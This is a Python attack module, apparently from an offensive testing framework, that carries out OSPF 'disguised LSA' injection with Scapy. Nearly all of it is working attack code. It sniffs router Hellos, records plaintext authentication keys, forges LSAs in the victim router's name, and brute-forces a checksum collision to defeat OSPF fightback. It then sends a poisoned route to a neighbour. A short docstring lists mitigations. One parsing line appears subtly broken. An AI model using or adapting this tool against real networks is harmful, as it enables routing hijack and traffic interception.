"""
ospf — OSPF Disguised LSA Injection
ATT&CK: T1557-adjacent — routing protocol manipulation (disguised LSA / fightback evasion)

Injects a Router-LSA disguised as originating from the victim router, defeating
OSPF's fightback mechanism by pre-computing a dummy-link metric whose LSA
checksum collides with the victim's expected fightback LSA (Nakibly et al.
"disguised LSA"). The neighbour accepts the disguised LSA and discards the
victim's later fightback as a duplicate.

Supports plaintext and MD5 (RFC 2328) OSPF authentication (key sniffed/derived
from Hello timing). This is a stateful, timing-sensitive attack — validate in a
GNS3/EVE-NG lab against the exact target IOS before relying on it.

Mitigation: OSPF cryptographic authentication with strong keys, passive
interfaces on access segments, and out-of-band LSDB monitoring.
"""

import sys
import time

sys.stderr = None
from scapy.all import *          # noqa: F401,F403  (OSPF contrib classes)
try:
    import scapy.contrib.ospf
except ImportError:
    pass
sys.stderr = sys.__stderr__

NAME = "ospf"
DESCRIPTION = "OSPF disguised LSA injection — bypass fightback mechanism"
ATTCK_ID = "T1557"

# ---- tunables (see original PoC notes) -------------------------------------
# Milliseconds to wait after the victim's legitimate LSA before sending the
# trigger + disguised LSA. Keep between 4500 and 5000.
TIME_TO_SEND_MS = 4800
SNIFF_COUNT = 5
MINLSINTERVAL = 5000  # ms

# ---- state (module globals, set in run()) ----------------------------------
victim_ip = None
neighbor_ip = None
iface = None
auth_seq_tracker = dict()
start_minlsinterval = 0


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help="OSPF disguised LSA injection")
    p.add_argument("-v", "--victim-ip", dest="victim_ip", required=True,
                   help="Interface IP of the victim router")
    p.add_argument("-n", "--neighbor-ip", dest="neighbor_ip", required=True,
                   help="IP to send the disguised LSA to (victim's neighbour)")
    p.add_argument("-i", "--iface", required=True,
                   help="Interface for sniffing and sending")
    p.add_argument("-k", "--md5-key", dest="md5_key", default=None,
                   help="MD5 auth key (if the network uses MD5 authentication)")
    add_engagement_args(p)
    p.set_defaults(func=run)


# ---------------------------------------------------------------------------
# Packet parsing / helpers (ported verbatim in behaviour from the PoC)
# ---------------------------------------------------------------------------
def construct_ospf(pkt):
    """Rebuild a typed OSPF layer from raw packet bytes."""
    sys.byteorder = "big"
    bytes_pkt = bytes(pkt)
    if IP in pkt and pkt[IP].proto == 89:
        if OSPF_Hdr in pkt:
            ospf_data = bytes_pkt[34:]
            ospf_hdr = ospf_data[:24]
            header = OSPF_Hdr(
                version=ospf_hdr[0], type=ospf_hdr[1],
                len=int.from_bytes(ospf_hdr[2:4], sys.byteorder),
                src='.'.join(str(o) for o in ospf_hdr[4:8]),
                area='.'.join(str(o) for o in ospf_hdr[8:12]),
                chksum=int.from_bytes(ospf_hdr[12:14], sys.byteorder),
                authtype=(at if (at := int.from_bytes(ospf_hdr[14:16], sys.byteorder)) != 2 else 0),
                authdata=int.from_bytes(ospf_hdr[16:24], sys.byteorder),
            )
            ospf_payload = ospf_data[24:header.len]
            if header.type == 1:
                ospf_pkt = header / OSPF_Hello(ospf_payload)
            elif header.type == 2:
                data = OSPF_DBDesc(
                    mtu=int.from_bytes(ospf_payload[:2], sys.byteorder),
                    options=ospf_payload[2], dbdescr=ospf_payload[3],
                    ddseq=int.from_bytes(ospf_payload[4:8], sys.byteorder),
                    lsaheaders=[])
                offset = 8
                for i in range((len(ospf_payload) - 8) // 20):
                    h = ospf_payload[offset + i * 20:offset + (i + 1) * 20]
                    data.lsaheaders.append(OSPF_LSA_Hdr(
                        age=int.from_bytes(h[0:2], sys.byteorder), options=h[2],
                        type=h[3], id='.'.join(str(o) for o in h[4:8]),
                        adrouter='.'.join(str(o) for o in h[8:12]),
                        seq=int.from_bytes(h[12:16], sys.byteorder),
                        chksum=int.from_bytes(h[16:18], sys.byteorder),
                        len=int.from_bytes(h[18:20], sys.byteorder)))
                ospf_pkt = header / data
            elif header.type == 3:
                data = OSPF_LSReq(requests=[])
                for i in range(len(ospf_payload) // 12):
                    r = ospf_payload[i * 12:(i + 1) * 21]
                    data.requests.append(OSPF_LSReq_Item(
                        type=r[0:4], id='.'.join(str(o) for o in r[4:8]),
                        adrouter='.'.join(str(o) for o in r[8:12])))
                ospf_pkt = header / data
            elif header.type == 4:
                count = int.from_bytes(ospf_payload[:4], sys.byteorder)
                data = OSPF_LSUpd(lsacount=count, lsalist=[])
                offset = 4
                for _ in range(count):
                    inst = ospf_payload[offset:]
                    t = inst[3]
                    cls = scapy.contrib.ospf._OSPF_LSclasses.get(t, "Raw")
                    cls = getattr(scapy.contrib.ospf, cls) if cls != "Raw" else globals()[cls]
                    ls_len = int.from_bytes(inst[18:20], sys.byteorder)
                    data.lsalist.append(cls(inst[:ls_len]))
                    offset += ls_len
                ospf_pkt = header / data
            elif header.type == 5:
                data = OSPF_LSAck(lsaheaders=[])
                for i in range(len(ospf_payload) // 20):
                    h = ospf_payload[i * 20:(i + 1) * 20]
                    data.lsaheaders.append(OSPF_LSA_Hdr(
                        age=int.from_bytes(h[0:2], sys.byteorder), options=h[2],
                        type=h[3], id='.'.join(str(o) for o in h[4:8]),
                        adrouter='.'.join(str(o) for o in h[8:12]),
                        seq=int.from_bytes(h[12:16], sys.byteorder),
                        chksum=int.from_bytes(h[16:18], sys.byteorder),
                        len=int.from_bytes(h[18:20], sys.byteorder)))
                ospf_pkt = header / data

            if int.from_bytes(ospf_hdr[14:16], sys.byteorder) == 2:
                ospf_pkt[OSPF_Hdr].authtype = 2
                ospf_pkt[OSPF_Hdr].reserved = int.from_bytes(ospf_hdr[16:18], sys.byteorder)
                ospf_pkt[OSPF_Hdr].keyid = ospf_hdr[18]
                ospf_pkt[OSPF_Hdr].authdatalen = ospf_hdr[19]
                ospf_pkt[OSPF_Hdr].seq = int.from_bytes(ospf_hdr[20:24], sys.byteorder)
                ospf_pkt[OSPF_Hdr].authdata16 = (ospf_data[header.len:header.len + 16]).hex()
        return ospf_pkt
    return pkt


def check_hello_packet(pkt):
    return OSPF_Hdr in pkt and pkt[OSPF_Hdr].type == 1


def filter_victim_LSA(victim, pkt):
    global start_minlsinterval
    current_time = round(time.time() * 1000)
    pkt = construct_ospf(pkt)
    if OSPF_Hdr in pkt and OSPF_Router_LSA in pkt:
        for lsa in pkt[OSPF_LSUpd].lsalist:
            if OSPF_Router_LSA in lsa and lsa[OSPF_Router_LSA].adrouter == victim:
                start_minlsinterval = current_time
                return True
    return False


def update_auth_seq(pkt):
    pkt = construct_ospf(pkt)
    router_id = pkt[OSPF_Hdr].src
    if router_id not in auth_seq_tracker:
        auth_seq_tracker[router_id] = 0
    hdr_seq = int.from_bytes(bytes(pkt[OSPF_Hdr])[20:24], sys.byteorder)
    curr_time = round(time.time())
    auth_seq_tracker[router_id] = (hdr_seq - curr_time, curr_time)


def auth_seq_sniff():
    sniff(lfilter=lambda p: OSPF_Hdr in p, iface=iface,
          prn=update_auth_seq, count=SNIFF_COUNT)


def build_dict(pkts):
    ip_to_router_id = dict()
    authentication = {"authtype": 0, "authdata": []}
    for pkt in pkts:
        if IP in pkt and pkt[IP].src not in ip_to_router_id:
            ip_to_router_id[pkt[IP].src] = pkt[OSPF_Hdr].src
        if OSPF_Hdr in pkt and pkt[OSPF_Hdr].authtype == 2:
            authentication["authtype"] = 2
            wrpcap('export_md5_pkts.pcap', pkt, append=True)
            authentication["keyid"] = pkt[OSPF_Hdr].keyid
        elif OSPF_Hdr in pkt and pkt[OSPF_Hdr].authtype == 1:
            authentication["authtype"] = 1
            authentication["authkey"] = pkt[OSPF_Hdr].authdata
    return ip_to_router_id, authentication


def get_victim_lsa(victim_routerId, pkt):
    if OSPF_Router_LSA in pkt:
        for lsa in pkt[OSPF_LSUpd].lsalist:
            if OSPF_Router_LSA in lsa and lsa[OSPF_Router_LSA].adrouter == victim_routerId:
                return lsa[OSPF_Router_LSA]
    return None


def get_required_params(victim_routerId, pkt_orig, logger):
    victim_lsa = get_victim_lsa(victim_routerId, pkt_orig)
    if victim_lsa is None:
        logger.error("Victim router LSA not found in captured packet.")
        sys.exit(1)
    return pkt_orig[OSPF_Hdr].area, victim_lsa


def get_fake_metric_value(fightback_lsa, evil_lsa, dummy_link_index):
    """Brute-force a dummy-link metric so the disguised LSA checksum collides
    with the victim's fightback LSA checksum."""
    tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
    fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())
    for metric in range(0, 65535):
        tmp_lsa[OSPF_Router_LSA].linklist[dummy_link_index].metric = metric
        if ospf_lsa_checksum(tmp_lsa.build()) == fightback_checksum:
            return metric
    return 0


def create_disguised_packet(ip_to_router_id, authentication, victim_lsa,
                            area="0.0.0.0", authkey=None, logger=None):
    hdr = OSPF_Hdr(version=2, type=4, src=ip_to_router_id[victim_ip], area=area,
                   chksum=None, len=None, authtype=authentication["authtype"])
    if hdr.authtype == 2:
        hdr.authdata16 = authkey.encode() if isinstance(authkey, str) else authkey
        hdr.keyid = authentication["keyid"]
    elif hdr.authtype == 1:
        hdr.authdata = authentication.get("authkey", 0)

    falsified = victim_lsa.copy()
    falsified.seq = victim_lsa.seq + 2
    falsified.chksum = None
    falsified.id = ip_to_router_id[victim_ip]
    falsified.adrouter = ip_to_router_id[victim_ip]

    malicious_link = OSPF_Link(metric=0, toscount=0, type=3,
                               data="255.255.255.224", id="192.168.3.96")
    checksum_link = OSPF_Link(metric=0, toscount=0, type=3,
                              data="255.255.255.0", id="172.16.66.0")
    falsified.linklist.extend(malicious_link)
    falsified.linklist.extend(checksum_link)  # dummy link always last
    falsified.len += 2 * 12

    ls_update = OSPF_LSUpd(lsalist=[falsified])
    falsified.linkcount = len(ls_update.lsalist[-1][OSPF_Router_LSA].linklist)
    dummy_index = ls_update.lsalist[-1][OSPF_Router_LSA].linkcount - 1

    victim_lsa.seq += 2
    if logger:
        logger.info("Brute forcing checksum collision...")
    faked_metric = get_fake_metric_value(
        victim_lsa, ls_update.lsalist[-1][OSPF_Router_LSA], dummy_index)
    ls_update.lsalist[-1][OSPF_Router_LSA].linklist[dummy_index][OSPF_Link].metric = faked_metric
    return hdr, ls_update


def create_trigger_packet(ip_to_router_id, authentication, victim_lsa,
                          area="0.0.0.0", authkey=None):
    hdr = OSPF_Hdr(version=2, type=4, src=ip_to_router_id[neighbor_ip], area=area,
                   chksum=None, len=None, authtype=authentication["authtype"])
    if hdr.authtype == 2:
        hdr.authdata16 = authkey.encode() if isinstance(authkey, str) else authkey
        hdr.keyid = authentication["keyid"]
    elif hdr.authtype == 1:
        hdr.authdata = authentication.get("authkey", 0)

    falsified = OSPF_Router_LSA()
    falsified.age = victim_lsa.age
    falsified.options = victim_lsa.options
    falsified.type = victim_lsa.type
    falsified.seq = victim_lsa.seq + 1
    falsified.chksum = None
    falsified.flags = victim_lsa.flags
    falsified.id = ip_to_router_id[victim_ip]
    falsified.adrouter = ip_to_router_id[victim_ip]

    trigger_link = OSPF_Link(metric=1, toscount=0, type=3,
                             data="255.255.255.0", id="172.16.66.0")
    falsified.linklist.extend(trigger_link)
    ls_update = OSPF_LSUpd(lsalist=[falsified])
    ls_update.lsalist[-1][OSPF_Router_LSA].linkcount = len(
        ls_update.lsalist[-1][OSPF_Router_LSA].linklist)
    return hdr, ls_update


# ---------------------------------------------------------------------------
def run(args, logger):
    global victim_ip, neighbor_ip, iface
    from core.common import require_root
    require_root()

    load_contrib("ospf")
    victim_ip = args.victim_ip
    neighbor_ip = args.neighbor_ip
    iface = args.iface
    authkey = args.md5_key

    logger.info("OSPF disguised LSA | victim=%s neighbor=%s iface=%s",
                victim_ip, neighbor_ip, iface)

    hello_pkts = sniff(iface=iface, lfilter=lambda x: check_hello_packet(x),
                       count=SNIFF_COUNT)
    ip_to_router_id, authentication = build_dict(hello_pkts)

    if authentication["authtype"] == 2 and authkey is None:
        logger.error("Network uses MD5 auth but no key supplied (-k).")
        return 1

    if authentication["authtype"] == 2:
        auth_seq_sniff()

    logger.info("Sniffing for the victim router's LSUpdate...")
    pkts = sniff(iface=iface,
                 stop_filter=lambda x: filter_victim_LSA(ip_to_router_id[victim_ip], x))
    pkt_orig = construct_ospf(pkts[-1])
    area, victim_lsa = get_required_params(ip_to_router_id[victim_ip], pkt_orig, logger)

    logger.info("Preparing trigger packet...")
    pkt_trig = Ether(type=0x0800) / IP(
        src=neighbor_ip,
        dst=victim_ip if authentication["authtype"] != 2 else "224.0.0.5",
        chksum=None, len=None, ttl=1, proto=89)
    trig_hdr, trig_upd = create_trigger_packet(
        ip_to_router_id, authentication, victim_lsa, area, authkey)

    logger.info("Preparing disguised packet...")
    pkt_disg = Ether(type=0x0800) / IP(
        src=victim_ip,
        dst=neighbor_ip if authentication["authtype"] != 2 else "224.0.0.5",
        chksum=None, len=None, ttl=1, proto=89)
    disg_hdr, disg_upd = create_disguised_packet(
        ip_to_router_id, authentication, victim_lsa, area, authkey, logger)

    logger.info("Waiting on MinLSInterval cooldown...")
    diff = round(time.time() * 1000) - start_minlsinterval
    if diff < MINLSINTERVAL:
        sleep_ms = TIME_TO_SEND_MS - diff
        if sleep_ms > 0:
            time.sleep(sleep_ms / 1000)

    if authentication["authtype"] == 2:
        finished_time = round(time.time())
        # add an offset (e.g., 10) to ensure the sequence number is larger than what the router might have reached
        trig_hdr.seq = auth_seq_tracker.get(trig_hdr.src, (0, 0))[0] + finished_time + 10
        disg_hdr.seq = auth_seq_tracker.get(disg_hdr.src, (0, 0))[0] + finished_time + 10

    pkt_trig /= trig_hdr / trig_upd
    pkt_disg /= disg_hdr / disg_upd

    logger.info("Sending trigger + disguised packets...")
    sendpfast([pkt_trig, pkt_disg], iface=iface)
    logger.info("OSPF disguised LSA injection sent.")
